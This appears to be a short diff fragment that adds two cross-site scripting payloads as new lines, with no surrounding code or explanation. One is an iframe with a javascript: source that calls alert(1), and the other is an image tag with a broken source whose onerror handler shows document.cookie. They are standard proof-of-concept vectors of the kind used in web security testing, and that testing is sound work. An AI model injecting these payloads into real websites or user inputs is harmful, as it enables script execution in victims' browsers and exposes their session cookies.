@@ -1,0 +1,2 @@
+<iframe src="javascript:alert(1)">  
+<img src="x" onerror="alert(document.cookie)">  
